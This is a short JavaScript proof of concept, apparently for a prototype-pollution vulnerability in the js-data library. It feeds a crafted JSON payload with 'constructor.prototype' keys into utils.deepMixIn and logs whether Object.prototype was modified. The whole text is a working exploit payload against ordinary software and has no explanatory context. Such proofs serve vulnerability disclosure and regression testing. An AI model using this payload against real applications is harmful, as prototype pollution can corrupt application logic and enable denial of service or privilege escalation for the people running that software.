var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
utils.deepMixIn(obj, source);
console.log({}.polluted);